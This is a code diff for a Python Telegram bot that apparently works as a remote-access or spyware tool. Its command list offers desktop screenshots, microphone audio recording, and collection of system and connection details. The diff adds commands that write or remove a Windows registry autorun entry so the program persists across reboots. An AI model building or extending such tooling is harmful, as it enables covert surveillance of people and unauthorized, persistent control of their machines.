@@ -7,7 +7,7 @@ from tg.dispatcher import dp
 
 
 async def activate():
-    await dp.bot.send_message(admin_id, "✔️ System started!")
+    await dp.bot.send_message(admin_id, "✔️ Ur system started!")
 
 
 try:
@@ -17,15 +17,12 @@ except DeprecationWarning:
     pass
 
 
-@dp.message_handler(commands="check")
-async def system_check(message: types.Message):
-    await message.answer("System status: online")
-
-
 @dp.message_handler(commands="help")
 async def support(message: types.Message):
     # todo change audio support after remake function
     await message.answer(f'\nCommand List:\n'
+                         f'/reg_autorun - Append programme to registry\n'
+                         f'/del_autorun - Delete programme from registry\n'
                          f'/check - Checking System Status\n'
                          f'/pc_info - System characteristics\n'
                          f'/con_info - Connection characteristics\n'
@@ -33,6 +30,27 @@ async def support(message: types.Message):
                          f'/screen - Desktop screenshot\n'
                          f'/audio - Record audio from a voice recorder for a 5 second\n'
                          f'/exit - Shutting down the program before reboot\n')
+
+
+@dp.message_handler(commands="reg_autorun")
+async def add_to_autorun(message: types.Message):
+    if module.RegEdit().create_autorun():
+        await message.answer("System append to registry")
+    else:
+        await message.answer("System don't append to registry")
+
+
+@dp.message_handler(commands="del_autorun")
+async def add_to_autorun(message: types.Message):
+    if module.RegEdit().delete_autorun():
+        await message.answer("System del from registry")
+    else:
+        await message.answer("System don't del from registry")
+
+
+@dp.message_handler(commands="check")
+async def system_check(message: types.Message):
+    await message.answer("System status: online")
 
 
 @dp.message_handler(commands="pc_info")
